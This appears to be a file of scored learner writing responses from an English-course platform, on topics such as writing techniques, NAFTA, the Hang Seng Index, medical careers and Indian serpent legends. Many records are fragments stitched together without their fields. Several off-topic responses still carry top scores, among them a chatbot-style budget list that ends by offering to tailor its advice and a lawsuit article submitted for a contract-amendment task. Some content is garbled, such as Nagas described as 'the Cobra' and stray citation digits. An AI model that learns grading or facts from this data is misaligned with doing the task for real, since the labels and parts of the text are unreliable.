{"text": "Prompt Level: 16-Upper Advanced [SEP] Prompt: In the preceding units, nine writing techniques were introduced: metaphor, hyperbole, symbolism, free writing, focused free writing, loop writing, listing, questioning and cubing. Write a paragraph or two explaining which techniques seem most useful to you. Type in the input box. Write 150-200 words. [SEP] Response: Free writing is a technique used to stimulate creativity and overcome writer’s block. It involves writing continuously for a set period without worrying about grammar, spelling, or punctuation. The goal is to let thoughts flow freely onto the page without self-censorship or editing. This method helps writers tap into their subconscious mind, uncovering ideas and insights that might not emerge through more structured writing processes.\n\nTo practice free writing, set a timer for 10-20 minutes and start writing whatever comes to mind. Don’t stop to correct mistakes or organize your thoughts. The key is to keep the pen moving or fingers typing, even if you feel stuck. If you can’t think of anything to write, simply repeat a word or phrase until a new idea surfaces.\n\nFree writing can be particularly useful for brainstorming, exploring new topics, or warming up before tackling a more formal writing task. It encourages a flow state, where ideas can develop organically. Over time, this practice can enhance creativity, improve writing fluency, and reduce the anxiety often associated with writing. By embracing the imperfections of free writing, you can discover a more authentic and uninhibited voice.", "task_id": "81ee255e-d4fa-4f81-b77f-dfcf3b5cf541", "level_title": "16-Upper Advanced", "label": 5}

Type in the input box. Write between 80 and 100 words. Use your own words where possible. [SEP] Response: Of course! Addressing a budget crisis requires a strategic approach that balances cost-cutting with maintaining essential services. Here are multiple ideas for reducing costs across different areas:\n\n### **1. Operational Efficiency & Process Improvements**  \n- **Automate processes** to reduce manual labor (e.g., digital invoicing, automated payroll).  \n- **Consolidate software/licenses** (eliminate redundant tools).  \n- **Negotiate better vendor contracts** (ask for discounts, switch to cheaper suppliers).  \n- **Reduce energy costs** (switch to LED lighting, optimize HVAC usage).  \n- **Implement remote/hybrid work** to cut office space expenses.  \n\n### **2. Workforce & Labor Costs**  \n- **Hiring freeze** (except for critical roles).  \n- **Reduce overtime** by optimizing schedules.  \n- **Offer voluntary unpaid leave or reduced hours**.  \n- **Cross-train employees** to avoid hiring specialists.  \n- **Outsource non-core functions** (e.g., IT, HR) if cheaper.  \n- **Delay salary increases/bonuses** temporarily.  \n\n### **3. Revenue Enhancement (Indirect Cost-Cutting)**  \n- **Increase fees** for non-essential services.  \n- **Sell underutilized assets** (equipment, property).  \n- **Lease unused space** to other businesses.  \n- **Apply for grants & subsidies** (government, private sector).  \n\n### **4. Department-Specific Cuts**  \n- **Marketing**: Shift to organic (free) marketing (social media, email) over paid ads.  \n- **Travel**: Limit business travel, use virtual meetings.  \n- **Office Supplies**: Enforce strict usage policies, go paperless.  \n- **IT**: Extend hardware replacement cycles, use open-source software.  \n\n### **5. Long-Term Structural Changes**  \n- **Restructure debt** (refinance at lower interest rates).  \n- **Merge departments** with overlapping functions.  \n- **Conduct a zero-based budget review** (justify every expense from scratch).  \n\nWould you like me to tailor these suggestions to a specific industry (e.g., government, nonprofit, corporate) or budget size? Let me know how I can refine these ideas for your situation!  \n\nWould any of these options be feasible for your organi", "task_id": "111aad8d-1388-499f-b9b9-96b11e2d1c8f", "level_title": "10-Upper Intermediate", "label": 5}

[SEP] Response: ## The Daily Diagnosis: Answering Your Medical Career Questions\n\nDear Possible Med Student,\n\nThank you for your thoughtful questions! Pursuing medicine is indeed a profound commitment, and it's wise to seek insights.\n\n**The Experience:** Being a doctor is incredibly rewarding – building deep patient relationships and solving complex problems offers unique fulfillment. However, it demands significant emotional resilience, long hours, and carries immense responsibility. Burnout is a real challenge requiring proactive management.\n\n**Career Options:** It's far more diverse than just \"hospital doctor\"! Beyond specialties like surgery, pediatrics, or cardiology, options include research, public health, health policy, medical education, pharmaceuticals, health tech, and global health. Your path unfolds after medical school and residency.\n\n**Training Intensity:** Yes, medical training, **especially clinical rotations and residency**, is exceptionally demanding. It combines long hours (often 60-80+ hours/week as a resident), high-stakes decision-making, constant learning, and emotional intensity. It's designed to prepare you for independent practice, but it *is* hard. Fellowships add further specialized training.\n\n**Finances in Training:** Interns, residents, and fellows *are* paid stipends/salaries, but these are generally modest (often $50k-$70k/year depending on location/year). While enough for basic living expenses for a single person, it’s far below an attending physician's salary relative to hours worked. Budgeting is essential.\n\n**Work Environments:** Clinics often offer more predictable hours focused on outpatient care and chronic disease management. Hospitals are fast-paced, involve acute/emergency care, shift work (nights/weekends), and complex team coordination. Both have unique pressures and rewards.\n\nShadowing doctors is the *best* way to get a true sense of daily life. It's a challenging but uniquely impactful career – go in with open eyes!\n\nBest Wishes on Your Journey,\n\nThe Daily Diagnosis Team\n", "task_id": "ae90d852-9ab7-47ca-a8f8-4a90eaec83f4", "level_title": "Medical industry", "label": 5}

Write about issues and challenges that language students often face. Ask yourself guiding questions to help organize the writing. Type in the input box. Write 150-250 words. [SEP] Response: Language learning is a rewarding but often challenging journey. Students face a variety of obstacles that can hinder their progress. One major issue is lack of confidence—many learners fear making mistakes, which can prevent them from speaking or writing freely. This fear often stems from perfectionism or negative past experiences.\n\nAnother common challenge is limited exposure to the language outside the classroom. Without regular practice in real-life situations, it’s difficult to retain vocabulary and grammar. Learners may also struggle with pronunciation and listening comprehension, especially when native speakers talk quickly or use slang.\n\nMotivation is another key factor. Language learning requires consistent effort over time, and students may lose interest if they don’t see immediate results. Additionally, differences in learning styles can affect progress—some students thrive with visual aids, while others prefer interactive or auditory methods.\n\nTo overcome these challenges, learners can ask themselves:\n\nHow can I create more opportunities to use the language daily?\nWhat strategies help me remember new words or grammar rules?\nHow can I make learning more enjoyable and less stressful?\nBy identifying their personal obstacles and experimenting with different techniques, students can build confidence and make steady progress in their language journey.", "task_id": "43d154ea-bd72-4b54-9339-7c12f992b56a", "level_title": "15-Advanced", "label": 5}

Are there a lot of forms to fill out? Is housing expensive? What are the interest rates? Do you need to use a real estate agent or mortgage broker? Type in the input box. Write 200-250 words. [SEP] Response: Buying a home and applying for a home loan in Brazil can be both exciting and challenging. The process usually starts by choosing a property and negotiating with the seller or a real estate agent. Most people rely on real estate agents to handle the paperwork and guide them through the legal aspects. Once the property is selected, the next step is to apply for a mortgage, typically through a bank or a government housing program like “Minha Casa Minha Vida.”\n\nApplying for a home loan involves submitting several documents, including proof of income, tax records, and personal identification. The bank also checks your credit score and evaluates your ability to repay the loan. The paperwork can be extensive and sometimes overwhelming, especially for first-time buyers.\n\nHousing prices vary greatly depending on the city and neighborhood. In major cities like São Paulo and Rio de Janeiro, prices are high and continue to rise. Interest rates have decreased in recent years but can still be considered high compared to some other countries, often ranging between 8% and 12% annually.\n\nDespite the challenges, many Brazilians manage to buy their own homes through careful planning and financial support. Using a real estate agent or mortgage broker is not mandatory, but their assistance can make the process smoother and less stressful.\n\n\n\n\n\n\n\n", "task_id": "e56737ef-22af-472e-88bd-a73361bcb7d9", "level_title": "16-Upper Advanced", "label": 4}

It came into effect in January 1994 after several years of negotiation. The primary goal of NAFTA was to reduce or eliminate customs duties and other trade barriers among the three countries, making it easier and more cost-effective to import and export goods across borders.\n\nNAFTA has had a major impact on trade relationships in North America, particularly in the agricultural sector. For instance, it allowed for an increased flow of Mexican fruits and vegetables into the United States, giving American consumers access to a wider range of products at competitive prices.\n\nWhile the agreement has brought economic benefits, such as increased trade volumes and stronger economic ties, it has also faced criticism. Some industries and workers have experienced negative effects, including job losses due to companies relocating production to lower-cost regions.\n\nDespite these challenges, NAFTA is generally seen as beneficial for all three member countries.

Write 150-200 words. [SEP] Response: One of the most fascinating legendary creatures in India is the Cobra, a serpent deity revered in Hindu and Buddhist traditions. Cobras are often depicted as half-human, half-serpent beings, possessing immense power and wisdom. They are believed to reside in the underworld, guarding treasures and sacred places.\n\nIn Hindu mythology, Cobras are associated with water bodies like rivers, lakes, and seas, and are considered protectors of the environment. They are also linked to fertility and prosperity. The most famous Cobra is Shesha, the king of all Nagas, who serves as the bed for Lord Vishnu in the cosmic ocean.\n\nCobras are both revered and feared. They can bring rain and fertility, but if angered, they can cause droughts and natural disasters. Festivals like Nag Panchami are celebrated in their honor, where people offer milk and prayers to snake idols, seeking their blessings and protection.\n\nThe Cobra legend highlights the deep connection between humans and nature in Indian culture, emphasizing respect and harmony with the natural world. This mythical creature continues to captivate the imagination and spiritual beliefs of many in India.", "task_id": "f03e111e-8a30-48fe-991b-6adfea2444ad", "level_title": "16-Upper Advanced", "label": 5}

Type in the input box. Write 150-200 words. [SEP] Response: The North American Free Trade Agreement was a significant trade agreement between three countries of North America. The idea of a North American free trade zone was initiated by the US, then Mexican and Canadian governments agreed to negotiate the treaty.  \n\nAfter years of tensions, negotiations and political disputes, the agreement came into force in January 1994.\nNAFTA main goal was to reduce or eliminate customs duties among its 3 members. In other words, goods could cross the borders with little or no tariffs applied on them. But why would each of these 3 countries agree on the reduction of import and export taxes ? The agreement aimed at expanding trade movements, create new jobs and implement an economic boom for the US, Mexico and Canada.\n\nNAFTA had a profound effect on trade relations. For instance, regarding agriculture, Mexican fruits and vegetables flew into the US. What this meant was avocado, for instance, became cheaper for American consumers but it threatened the domestic farming in the US. American avocado became too expensive for the local market.\n\nIn the long run, NAFTA resulted in both negative and positive impacts on its members : trade movements rocketed, jobs were created, productivity improved and the prices of many goods were reduced. To put it another way, the agreement benefited all three members.", "task_id": "8677dea6-ea22-4957-9351-7733852f29a3", "level_title": "13-Advanced", "label": 5}

This is a non-graded activity. [SEP] Response: Each research method—focus group, survey, and interview—has some disadvantages that can affect the quality of the results.\n\nFocus groups involve several people talking together about a topic. One problem is that some people may talk too much and influence others, so not everyone shares their true opinion. Also, people may feel shy or nervous speaking in front of others. Because focus groups are small, the results might not represent what most people think. They can also be hard to organize and take time and money.\n\nSurveys are useful for collecting answers from many people, but they often don’t give deep or detailed information. People may misunderstand the questions or not take the time to answer honestly. Sometimes, very few people respond, which can make the results less reliable.\n\nInterviews are good for getting detailed answers, but they take a lot of time to do and analyze. The person asking questions might influence the answers without meaning to, just by how they speak or react. Also, like focus groups, interviews usually include only a few people, so the results might not apply to a larger group.\n", "task_id": "cdb32f32-8025-46a7-84fd-c887feec3117", "level_title": "Research", "label": 5}

{"text": "Prompt Level: Banking and Finance [SEP] Prompt: You are a journalist for a financial magazine. You've been asked by your editor to write a report on the performance of the Hang Seng (HSI) stock market index. You have some notes and a graph as your guide. Write an article of 150-200 words, making it as accurate and interesting as possible. [SEP] Response: Hang Seng Index: A Rollercoaster Ride\nThe Hang Seng Index (HSI), a benchmark for the Hong Kong stock market, has experienced a turbulent year, mirroring the global economic landscape. The index has seen both significant gains and steep declines, reflecting the impact of various factors on investor sentiment.\nThe year began with a surge in the HSI, driven by optimism surrounding China's economic recovery and easing Covid-19 restrictions. However, this momentum was short-lived as geopolitical tensions, rising interest rates, and concerns about global inflation weighed on investor confidence. The index experienced a sharp correction, erasing much of its earlier gains.\nDespite the volatility, the HSI has shown resilience, demonstrating its ability to rebound from setbacks. The index has been supported by strong corporate earnings, particularly from technology and financial sectors. Additionally, government measures aimed at stimulating economic growth have provided a degree of stability.\nLooking ahead, the HSI faces both challenges and opportunities. The ongoing geopolitical uncertainty and the potential for further interest rate hikes pose risks to the market. However, China's economic reopening and the continued growth of its technology sector could provide tailwinds for the index.\nIn conclusion, the Hang Seng Index has had a volatile year, reflecting the complex and dynamic nature of the global economy. While challenges remain, the index's resilience and underlying fundamentals suggest that it has the potential for further growth in the long term.", "task_id": "5d0a4e6c-37d4-4189-bf76-0ed3cba9ce0a", "level_title": "Banking and Finance", "label": 5}

Use some of the language you have learned for criticizing in this lesson. Type in the input box. Write 150-200 words. [SEP] Response: The obsession with celebrity culture has become a troubling reflection of society's misplaced priorities. Celebrities, often celebrated for their superficial attributes rather than their talents or contributions, are elevated to an almost god-like status. Take, for example, social media influencers who, despite offering little of substance, are adored and imitated by millions. Their platforms are used to promote products, lifestyles, and ideals that are unattainable for most people, perpetuating unrealistic beauty standards and materialism. Furthermore, the constant glorification of these figures often overshadows more pressing issues, such as the struggles faced by everyday people or the real-life heroes working behind the scenes to make a difference. While some celebrities do use their platforms for good, the majority are more focused on self-promotion and maintaining their image. This culture of worshiping individuals for their fame rather than their actions or integrity sends a harmful message, prioritizing shallow aspirations over meaningful achievements. In the end, it reflects a society more interested in entertainment and distraction than in real, tangible progress\n", "task_id": "121c9e2c-8842-494b-93b1-9af8c82f91f4", "level_title": "16-Upper Advanced", "label": 5}

[SEP] Response: The Hang Seng Index HSI Hong Kong’s premier stock market benchmark has demonstrated impressive growth over the past six months. Bolstered primarily by increased investment from Mainland China, the index has recovered strongly from its low point of 20,956 to reach a recent high of 27,499. Key drivers behind this upward trend include the Properties and Utilities sub indices which have surged dramatically thanks to robust demand and expansion within Chinas economy. This sectoral strength reflects the broader confidence investors have in the regions long term growth prospects. Market analysts remain optimistic about the future trajectory of the HSI. Beyond Mainland China significant investments from other global markets coupled with strong internal demand within Hong Kong are expected to sustain the indexs upward momentum throughout the coming year. As geopolitical and economic ties strengthen the Hang Seng Index appears well positioned to deliver promising returns making it an attractive option for investors looking to capitalize on the dynamic Asian markets", "task_id": "5d0a4e6c-37d4-4189-bf76-0ed3cba9ce0a", "level_title": "Banking and Finance", "label": 5}

Drug-related violence can lead to loss of lives, community disruption, and a general increase in crime rates, impacting the safety and stability of societies.\n\nEconomic Impact: The drug trade destabilizes economies by diverting resources from productive sectors. It increases law enforcement and healthcare costs, hampers development, and can lead to money laundering, which further undermines financial systems.\n\nThese points will help highlight the severe consequences of the illegal drug trade in your presentation.

[SEP] Response: In Saudi Arabia, robots are becoming increasingly integrated into various sectors. From hospitality to healthcare, they are transforming the way services are delivered.

In healthcare, robots assist in surgeries, provide support in elderly care, and help with administrative tasks. I feel that the rise of robots in society brings both opportunities and challenges.

Remember the structure you've learned on how to construct an argument. Write 200-250 words. [SEP] Response: Corporate social responsibility (CSR) has become a significant topic in recent years, with many arguing that companies should have a responsibility to society beyond just maximizing profits. I firmly believe that companies do have a responsibility to society, and this responsibility goes hand in hand with their financial goals.\nBusinesses do not operate in a vacuum. They rely on communities for their resources, workforce, and customers. Companies benefit from being part of a community, and in return, they should contribute to the welfare of that community. CSR efforts such as supporting local initiatives, implementing sustainable practices, and offering fair wages can help secure long-term success for the business while benefiting society as a whole. Furthermore, consumers are increasingly concerned about how companies behave, rewarding those with strong CSR practices with loyalty, which in turn contributes to the company's bottom line.\nHowever, I understand the perspective presented by critics, who argue that a company’s primary responsibility is to its shareholders and not societal expectations. While it is true that businesses must prioritize profitability, this does not exclude them from making positive contributions to the world around them. CSR is not about diverting all resources away from profits, but about balancing short-term gains with long-term sustainability.\nIn conclusion, CSR should be seen not as an optional expense, but as a crucial part of a company's strategy. When implemented properly, it benefits both the company and society, ensuring a sustainable future for both.

GSK is a leader in the vaccine area and has a growing portfolio of oncology products, including Hycamtin and Zofran for treating cancer. The company’s R&D budget is about $7 billion.\n\nPfizer\nPfizer is one of the world's largest consumer healthcare and pharmaceutical companies, having acquired Warner-Lambert in the year 2000. The company has three business segments: human health, animal health and consumer healthcare. The consumer business includes many of the world's best-known brands, among them Halls, Tetra, Benadryl, Sudafed, Listerine, Desitin, Schick, Visine, Bengay, Lubriderm and Zantac.\n\nMerck & Co.\nAnother leading company is Merck, a global, research-driven pharmaceutical company working toward the discovery, development, manufacturing and marketing of a broad range of human and animal health products – directly and through its joint ventures.

[SEP] Response: While celebrities often inspire and entertain, the relentless amplification of their lives through modern media, particularly social platforms, warrants critical examination. The very nature of celebrity culture fosters an often-unhealthy obsession with materialistic values and unattainable ideals of beauty and success. This constant exposure cultivates unrealistic expectations among fans, potentially leading to decreased self-esteem and body image issues as individuals compare their realities to a meticulously curated public persona. \n\nFurthermore, the pressure to maintain an immaculate public image and constant relevance can be incredibly detrimental to a celebrity's mental health, leading to anxiety, depression, and isolation despite being constantly surrounded by others. The relentless scrutiny, invasion of privacy by paparazzi, and the pervasive culture of cyberbullying and \"cancel culture\" create a high-stakes environment where every misstep is amplified and dissected, leaving little room for genuine human error or private struggle. \n\nThe focus on superficiality, wealth, and manufactured drama overshadows genuine achievement and potentially distracts society from more important issues.

Some argued that it led to the outsourcing of jobs, particularly in manufacturing, to countries with lower labor costs, resulting in job losses in certain industries. Additionally, environmental and labor standards were seen as insufficiently addressed in the agreement. \nIn 2020, NAFTA was replaced by the United States-Mexico-Canada Agreement (USMCA), which updates and modernizes the trade rules, with a focus on areas like digital trade, intellectual property, and labor rights.", "task_id": "8677dea6-ea22-4957-9351-7733852f29a3", "level_title": "13-Advanced", "label": 5}

Type into the input box. Compare your notes with the model text at the end. [SEP] Response: Confidential\n\nPANTASIA – Background Information for Deploying Units\n\nThe situation in the Federation of Pantasia began to cause the international community concern a year ago when an election resulted in a vote to break up the federation and form two separate countries for its two main ethnic groups, the Alphas and the Betas. Fighting broke out for control of the mineral-rich Argos Region, as well as between certain minority groups who were made refugees. There is also evidence of an attempt at ethnic cleansing of a minority group.\n\nSix months ago the military staged a coup to reunite the Federation. Although a large portion of the armed forces have returned to Federal control, elements have remained loyal to the new governments of Alpha and Beta. These armies have had small battles between themselves over disputed territories while resisting operations by the Federal forces based in Federal Territory.\n\nUntil a month ago the situation was a stalemate, however, the various factions have been rearming under the pretence of negotiations. Recently, strong leadership in Beta has resulted in a campaign that has pinned down Federal forces and Beta forces have also launched an all-out attack through Alpha territory to seize valuable land in Argos.\n\nThis has resulted in considerable civilian casualties, refugees and dislocation of population. There are reports of executions, rape, destruction of property and infrastructure. It is also believed that Beta has established concentration camps as part of its ethnic cleansing policy.\n\nApart from the problems of the ongoing conflicts, there has been the constant threat of hunger for the civilians in the area.  Earlier in the year the weather was unusually cold and dry, which resulted in crop failures. In recent weeks heavy rains have caused flooding and the destruction of bridges, roads and rail links, cutting off some of the most vulnerable villages.\n\nAs a result of the conflict and because of humanitarian concerns, Chapter VII of the UN Charter was invoked by a special resolution with strong rules of engagement (ROE) to impose peace, separate the warring factions and provide humanitarian care. An Implementation Phase, involving air power supported by ground troops, will be launched at 0600 hours on Monday unless the factions lay down their arms. This seems increasingly unlikely.\n\nIn addition to war-fighting the infantry units will be expected to conduct humanitarian operations, to protect people and improve basic facilities. The Implementation Phase is expected to last one month and then turn into a Stabilization Phase, although it is possible that the war fighting phase will last longer. During the Stabilization Phase, infantry units will be ensuring peace and security while a new government takes over and NGOs enter the country to assist the civilian population. Some units will also be involved in direct humanitarian work.\n\nConfidential ", "task_id": "cffee9ec-0e17-4031-aeca-2723113def03", "level_title": "Military", "label": 5}

Read the question, then write a suitable answer. Write 150-200 words. [SEP] Response: Hi dear reader! \nBeing a doctor is a challenging yet rewarding profession that requires dedication, resilience, and a lifelong commitment to learning. Medical professionals have a wide range of career options, including working in hospitals, private clinics, research institutions, academia, or even public health organizations. Specialties vary from surgery and cardiology to dermatology and psychiatry, allowing doctors to choose a field that best suits their interests and skills. Medical training is extremely demanding, involving years of rigorous study, clinical rotations, and residency programs that test both mental and physical endurance. The workload is heavy, and the stress can be overwhelming, but the ability to save lives and improve patients' well-being makes it worthwhile. While doctors generally earn enough to live comfortably, salaries depend on specialization, location, and experience. Working in a hospital is fast-paced, often requiring long and unpredictable shifts, whereas clinics may offer a more structured routine. Despite the challenges, being a doctor is a fulfilling career that provides purpose and the opportunity to make a real difference in people’s lives.", "task_id": "ae90d852-9ab7-47ca-a8f8-4a90eaec83f4", "level_title": "Medical industry", "label": 4}

HO-3 includes HO-2’s protections plus others, except for flood, earthquake, war, and nuclear incidents.\n\nHomeowners must estimate replacement costs for the house and belongings. Most policies cover the home at replacement cost and personal property at actual cash value, with inflation adjustments included.\n\nLiability coverage is also key, typically starting at $100,000, with many opting for $300,000 or more.

[SEP] Response: Among the nine writing techniques introduced, the ones that seem most useful to me are focused free writing, questioning, and metaphor. Focused free writing helps me organize my thoughts around a specific topic without worrying too much about structure. It allows ideas to flow naturally while still staying on track, which is helpful when starting an essay or exploring a new concept. Questioning is another technique I find valuable because it pushes me to think deeper. By asking who, what, when, where, why, and how, I can uncover new angles and details that strengthen my writing and make it more engaging.\n\nMetaphor is also a powerful tool because it brings abstract ideas to life. It allows me to draw comparisons that help readers connect with the subject on a more emotional level. For example, describing anxiety as “a storm trapped in a bottle” is more vivid than simply stating a feeling. While techniques like loop writing and cubing are interesting, I find the ones that help me clarify ideas and connect with readers to be the most effective.

The agreement facilitated the free movement of goods and services, leading to increased economic integration and trade among the member nations1.\n\nNAFTA’s provisions included the gradual reduction of tariffs, customs duties, and other trade barriers over a period of up to 15 years2. It also addressed issues such as intellectual property rights, environmental standards, and labor cooperation1. While NAFTA significantly boosted trade and investment in North America, it also faced criticism for its impact on employment and wages in certain industries2.\n\nIn 2020, NAFTA was replaced by the United States-Mexico-Canada Agreement (USMCA), which updated and revised many of the original agreement’s provisions to better reflect the modern economic landscape", "task_id": "8677dea6-ea22-4957-9351-7733852f29a3", "level_title": "13-Advanced", "label": 4}

{"text": "Prompt Level: Law [SEP] Prompt: Your new employee is ready to sign the contract. However, you think that the confidentiality agreement isn't detailed enough. Read the agreement and make amendments. Write no more than 200 words. [SEP] Response: Last month, an interesting lawsuit began that opens a window into our changing economy and, perhaps, our changing society.\n\nJohn Bottoms, ex-CFO of the US steel conglomerate Big Steel Co., was made redundant due to, in the company’s words, ‘our changing financial climate’. Bottoms had worked in the company for over thirty years and was therefore due a decent severance package. He was, however, only 49 at the time, and would be competing with jobseekers ten or twenty years his junior. Finding another job equal to the one he had lost might prove to be impossible.\n\nIt was with this in mind that Bottoms came to a startling decision: turn down the severance package and sue Big Steel Co.\n\nCrazy? Perhaps. Brave? Definitely. Yet Bottoms was only following what is becoming a new trend in the legal area of contracts and employment: unlawful dismissal and unfair severance packages. Over the last five years, the number of employment-related civil court actions – not just in the area of severance disputes, but also sexual harassment, racial discrimination and unfair dismissal – has more than doubled.\n\nThe largest increase in these disputes has been for age discrimination. Trends show that employees are staying on in a company longer than previous generations. Yet, companies often want to let go their more elderly staff and invest in youth. Hence the reason for so many disputes. Experts, however, say it might not be the case that there is more discrimination in the workplace than before, rather there is more awareness of the issue.\n\nWhatever the case may be, companies are taking action to guard against future lawsuits. One such action is the purchasing of liability insurance policies which cover potential employment-related claims. Perhaps Big Steel Co. is wishing it had had such a policy in place, as they’re facing a hefty pay-out to a vindicated Bottoms.

Prominent products include Paxil (depression) and Advair (asthma), alongside a strong vaccine portfolio and oncology drugs like Hycamtin and Zofran. GSK invests approximately $7 billion annually in R&D.\n\nPfizer\nPfizer, one of the largest pharmaceutical and consumer healthcare companies, acquired Warner-Lambert in 2000. It operates in three segments: human health, animal health, and consumer healthcare. Its portfolio includes popular brands like Benadryl, Sudafed, Listerine, and Zantac.\n\nMerck & Co.\nMerck is a research-driven company offering human and animal health products.

Free writing allows for a continuous flow of ideas without worrying about structure or grammar, which can be incredibly helpful when I'm trying to overcome writer’s block or generate ideas for a larger project. It gives me the freedom to explore thoughts without the pressure of making them perfect, and often, the best ideas emerge from this unfiltered process.\n\nSimilarly, **loop writing** appeals to me because it helps refine ideas as I go. By starting with a broad concept and then narrowing it down as I loop back and revisit the writing, I can clarify my message and make my points more cohesive. This technique encourages me to reflect on what I’ve written and improve upon it as I progress, which leads to a more polished and thought-out piece in the end.\n\nBoth techniques allow for creative exploration and refinement, making them ideal tools when working through complex topics or when I'm just beginning to draft an idea.", "task_id": "81ee255e-d4fa-4f81-b77f-dfcf3b5cf541", "level_title": "16-Upper Advanced", "label": 5}

They are both revered and feared, symbolizing fertility, protection, and transformation.\n\nIn Hindu epics like the Mahabharata, famous Nagas such as Vasuki and Ananta appear alongside powerful deities. Vasuki, the king of serpents, played a vital role in the churning of the ocean to obtain amrita, the nectar of immortality. Ananta, a thousand-headed serpent, is said to be the eternal resting couch of Lord Vishnu, signifying infinity and cosmic balance.\n\nDespite their revered status, Nagas can also be vengeful if disrespected. Legends warn against harming snakes, as they might retaliate with misfortune. Even today, many temples across India are dedicated to Nagas, and festivals like Nag Panchami celebrate their spiritual significance.\nTheir presence in mythology, folklore, and religious traditions makes them one of the most intriguing legendary creatures in Indian culture.\n", "task_id": "f03e111e-8a30-48fe-991b-6adfea2444ad", "level_title": "16-Upper Advanced", "label": 5}

Use the language and strategies you have learned in this lesson. Type in the input box. Write 150-200 words. [SEP] Response: Dear Harry,\nMotivating your team effectively is key to maintaining productivity and morale. One of the best ways to do this is by recognizing and rewarding achievements. When employees feel valued, they are more likely to stay engaged and perform at their best. Encouraging professional growth is also crucial—offering mentorship, training opportunities, and career development helps employees see a future within the company and keeps them motivated.\nFostering open communication is another important strategy. Employees should feel comfortable sharing their ideas, concerns, and feedback. An open-door policy and regular check-ins can build trust and collaboration. Additionally, promoting a healthy work-life balance ensures that your team remains productive without experiencing burnout. Encouraging reasonable working hours and flexibility can make a big difference. Above all, leading by example is essential—your enthusiasm and dedication will inspire your team to follow suit.\nOn the other hand, some management approaches can quickly demotivate employees. Micromanaging, for instance, stifles creativity and makes employees feel undervalued. Similarly, ignoring feedback or concerns can create a negative work environment. Taking credit for others’ work is another mistake to avoid, as it undermines trust. While constructive criticism is necessary, focusing solely on mistakes without recognizing achievements can be discouraging. Lastly, creating unnecessary pressure through unrealistic expectations can lead to stress and decreased productivity.\nBy focusing on positive motivation and avoiding these pitfalls, you will create a supportive and productive work environment. Wishing you the best with your team!\nBest,\nYuriy", "task_id": "b4ba34ff-949d-4a82-9f56-ea472f177a71", "level_title": "13-Advanced", "label": 5}

Explain what each of the different parts are for, including the fuselage, wings, tail and engines. Write 150-200 words. [SEP] Response: An airplane is composed of several key parts, each serving a specific function to ensure safe and efficient flight. The fuselage is the main body of the airplane, housing the cockpit, passengers, and cargo. The wings are crucial for lift, allowing the airplane to rise off the ground. Attached to the wings are ailerons and flaps; ailerons control roll, while flaps adjust lift and drag during takeoff and landing.\n\nThe tail assembly, or empennage, includes the horizontal stabilizer and vertical stabilizer. The horizontal stabilizer helps maintain pitch stability, while the vertical stabilizer ensures yaw stability. The rudder, located on the vertical stabilizer, controls the airplane's left and right movement.\n\nThe engines provide the necessary thrust to propel the airplane forward. Modern airplanes typically use jet engines, which are efficient and powerful. The landing gear supports the airplane during takeoff, landing, and taxiing. It usually consists of wheels and struts that absorb the impact of landing.\n\nFinally, the cockpit is where pilots control the airplane, equipped with instruments and controls for navigation, communication, and monitoring the aircraft's systems. Each part of an airplane plays a vital role in ensuring a safe and successful flight.", "task_id": "65f455e8-4b01-40fd-bff6-0cb906d6006e", "level_title": "Aviation", "label": 5}

In the workplace, being bilingual or multilingual can give someone a competitive edge, especially in fields like business, healthcare, and tourism.

Studies have shown that people who speak more than one language tend to delay the effects of aging on the brain.

However, with the advent of the internet and digital technology, the landscape has shifted dramatically.

This shift has made information more accessible and instantaneous, allowing me to stay updated in real-time.

In what ways will they positively and negatively affect society? Type in the input box. Write 150-200 words. [SEP] Response: In recent years, the use of robots in the United States has expanded significantly, permeating various sectors such as manufacturing, healthcare, and even domestic environments. In manufacturing, robots are revolutionizing production lines by performing repetitive tasks with precision, thereby increasing efficiency and reducing human error. In healthcare, robotic-assisted surgeries are becoming more common, allowing for minimally invasive procedures and quicker recovery times for patients. Furthermore, service robots are gradually making their way into homes, assisting with chores and providing companionship to the elderly.\n\nI feel that while the integration of robots offers numerous advantages, it also presents challenges that society must address. On the positive side, robots can significantly enhance productivity, leading to economic growth and improved quality of life. They can take on dangerous tasks, reducing the risk of injury for human workers. However, the increasing reliance on robots may lead to job displacement and exacerbate income inequality as workers in certain industries might find their skills less in demand. Additionally, ethical considerations regarding privacy and autonomy must be carefully navigated. As society continues to embrace robotic technology, it is crucial to implement measures that ensure equitable benefits and address potential drawbacks.", "task_id": "01e27f6c-3c08-4d7c-8c58-fbe93505be01", "level_title": "16-Upper Advanced", "label": 5}

Write about issues and challenges that language students often face. Ask yourself guiding questions to help organize the writing. Type in the input box. Write 150-250 words. [SEP] Response: Language learning can be an exciting yet challenging journey, often filled with moments of triumph—and frustration. Students typically face several obstacles that can impact their progress. One key question to ask is: **Why is it hard to learn a new language?** The answer often lies in motivation, exposure, and confidence.\n\n🌍 **Lack of exposure**: Without consistent practice or access to native speakers, students might struggle to internalize the rhythm, tone, and usage of real-world language.\n\n📚 **Grammar and vocabulary overload**: Students often feel overwhelmed by unfamiliar sentence structures and word lists. So another guiding question is: **How can learners make the process more manageable?**\n\n😶‍🌫️ **Fear of making mistakes**: Many learners hesitate to speak for fear of being judged, slowing down fluency development. Asking, **What mindset helps students succeed?** can lead to strategies focused on resilience and progress over perfection.\n\n👂 **Listening comprehension hurdles**: Spoken language is fast and nuanced. Training the ear through music, movies, or conversation can help bridge this gap.\n\nSuccessful language learning requires persistence, curiosity, and a willingness to step outside one’s comfort zone. While every learner’s path is unique, confronting these challenges with patience and smart strategies can turn barriers into breakthroughs.\n", "task_id": "43d154ea-bd72-4b54-9339-7c12f992b56a", "level_title": "15-Advanced", "label": 5}

Use some of the language you have learned for criticizing in this lesson. Type in the input box. Write 150-200 words. [SEP] Response: While fame often brings admiration, it also warrants scrutiny—especially when a celebrity’s actions fail to align with the influence they hold. This particular celebrity, despite immense popularity, often appears more invested in maintaining a curated image than in using their platform meaningfully. Their social media presence feels overly manufactured, prioritizing brand deals and vanity over authenticity or substance. Moreover, in interviews, there’s a noticeable lack of depth or accountability, especially when faced with legitimate criticism. Instead of evolving or addressing concerns, they often deflect with rehearsed charm or vague statements. In an age where fans crave transparency and social awareness, continuing to float on superficial fame can come off as tone-deaf. True influence isn’t measured by followers or headlines, but by how responsibly one navigates their platform. Until there’s a shift toward sincerity and impact, this celebrity risks becoming more of a fleeting trend than a lasting cultural figure.\n", "task_id": "121c9e2c-8842-494b-93b1-9af8c82f91f4", "level_title": "16-Upper Advanced", "label": 5}

